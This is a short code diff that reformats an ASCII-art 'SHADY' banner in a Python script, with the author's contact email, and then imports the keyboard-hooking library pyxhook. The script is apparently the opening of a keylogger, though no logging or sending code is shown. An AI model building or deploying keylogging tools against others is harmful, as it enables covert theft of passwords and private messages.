@@ -1,15 +1,17 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
-print(" .oooooo..o ooooo   ooooo       .o.       oooooooooo.   oooooo   oooo ")
-print("d8P'    `Y8 `888'   `888'      .888.      `888'   `Y8b   `888.   .8'  ")
-print("Y88bo.       888     888      .8"888.      888      888   `888. .8'   ")
-print(" `"Y8888o.   888ooooo888     .8' `888.     888      888    `888.8'    ")
-print("     `"Y88b  888     888    .88ooo8888.    888      888     `888'     ")
-print("oo     .d8P  888     888   .8'     `888.   888     d88'      888      ")
-print("8""88888P'  o888o   o888o o88o     o8888o o888bood8P'       o888o     ")
-print("                                     ping me --gsaran1209@gmail.com   ")
-
+print(
+"""
+ .oooooo..o ooooo   ooooo       .o.       oooooooooo.   oooooo   oooo 
+d8P'    `Y8 `888'   `888'      .888.      `888'   `Y8b   `888.   .8'  
+Y88bo.       888     888      .8"888.      888      888   `888. .8'   
+ `"Y8888o.   888ooooo888     .8' `888.     888      888    `888.8'    
+     `"Y88b  888     888    .88ooo8888.    888      888     `888'     
+oo     .d8P  888     888   .8'     `888.   888     d88'      888      
+"8""88888P'  o888o   o888o o88o     o8888o o888bood8P'       o888o     
+                                                 ping me --gsaran1209@gmail.com   
+""")
 import pyxhook
 import time
 import sys
